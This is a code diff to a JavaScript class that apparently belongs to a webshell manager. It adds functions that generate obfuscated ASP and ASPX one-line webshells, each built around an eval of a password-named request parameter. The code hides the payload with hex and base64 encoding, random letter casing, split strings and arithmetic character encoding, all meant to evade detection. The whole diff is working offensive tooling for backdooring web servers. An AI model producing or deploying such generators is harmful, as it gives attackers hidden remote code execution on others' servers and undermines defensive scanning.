@@ -11,8 +11,10 @@ class Core {
           res(self._gen_php(argv.pwd));
           break;
         case "asp":
+          res(self._gen_asp(argv.pwd));
           break;
         case "aspx":
+          res(self._gen_aspx(argv.pwd));
           break;
         case "jsp":
           res(self._gen_jsp(argv.pwd));
@@ -94,6 +96,39 @@ if (cls != null) {
     data = data.replace("ASPWD", pwd);
     return data;
   }
+  _gen_asp(pwd) {
+    let self = this;
+    let cmd=Buffer.from(self._randomCaseStr(`eval(request("${pwd}"))`)).toString('hex');
+    let data = `<%<!--"-->
+execute(con("${cmd}"))
+Function con(ByRef strHex):Dim Length:Dim Max:Dim Str:Max = Len(strHex):For Length = 1 To Max Step 2:Str = Str & Chr("&h" & Mid(strHex, Length, 2)):Next:con = Str:End function')
+%>`;
+    return self._randomCaseStr(data);
+  }
+  _gen_aspx(pwd) {
+    let self = this;
+    let rnd = self._randint(1,1000000);
+    let cmd=Buffer.from(`${rnd};var safe="unsafe";eval(Request.Item['${pwd}'], safe);${rnd*3};`).toString('base64');
+    let sli = [];
+    for(var i=0; i < cmd.length/5 + 1; i++){
+      sli.push(cmd.slice(i*5,i*5+5));
+    }
+    let tmp = [];
+    sli[4].split('').forEach((c,_,arr)=>{
+      tmp.push(self._aspx_encode_char(c,self._randint(1,4)));
+    });
+    sli[4] = `'+${tmp.join("+")}+'`;
+    tmp = [];
+    sli[5].split('').forEach((c,_,arr)=>{
+      tmp.push(self._aspx_encode_char(c,self._randint(1,4)));
+    });
+    sli[5] = `'+${tmp.join("+")}+'`;
+    cmd = sli.join("'+'");
+    let data = `<%@Page Language="Jscript"%>
+<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${cmd}')));%>
+`;
+    return data;
+  }
   // 生成 php shell
   _gen_php(pwd){
     let self = this;
@@ -129,7 +164,49 @@ if (cls != null) {
     let php_line=`<?php \$${func_name}=create_function(${para},${func});\$${func_name}(base64_decode('${cmd}'));?>`;
     return php_line;
   }
-
+  _asp_encode_char(c, rnd) {
+    let self = this;
+    rnd = rnd || 1;
+    var n = self._randint(200, 1000);
+    switch(rnd){
+      case 2:
+        return `chr(${n*c.charCodeAt()}/${n})`;
+      default:
+        return `chr(${n}-${n-(c.charCodeAt())})`;
+    }
+  }
+  _aspx_encode_char(c, rnd) {
+    let self = this;
+    rnd = rnd || 1;
+    switch(rnd) {
+      case 1:
+        return `System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${Buffer.from(c).toString('base64')}'))`;
+      case 2:
+        var n = self._randint(200, 1000);
+        switch(n % 3) {
+          case 0:
+            return `char(${n}-${n-(c.charCodeAt())})`;
+          case 1:
+            return `char(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
+          case 2:
+            return `char(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
+        }
+        break;
+      case 3:
+        var n = self._randint(200,1000)
+        switch(n % 3){
+          case 0:
+            return `char(${n*c.charCodeAt()}/${n})`;
+          case 1:
+            return `char(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
+          case 2:
+            return `char(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
+        }
+        break;
+      default:
+        return `'${c}'`;
+    }
+  }
   /*
   * php 随机对字符进行转换
   */
@@ -151,6 +228,7 @@ if (cls != null) {
       case 2:
         return `chr(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
       }
+      break;
     case 3:
       return `str_rot13('${self._rot13(c)}')`;
     case 4:
@@ -187,6 +265,20 @@ if (cls != null) {
       pwd += chars.charAt(Math.floor(Math.random() * maxPos));
     }
     return pwd;
+  }
+  _randomCaseStr(str) {
+    let s = '';
+    for(var i=0; i<str.length; i++) {
+      s += this._randomCaseChr(str[i]);
+    }
+    return s;
+  }
+  // 随机大小写
+  _randomCaseChr(c) {
+    if(this._randint(0,1)) {
+      return c.toUpperCase()
+    }
+    return c.toLowerCase()
   }
 }
   
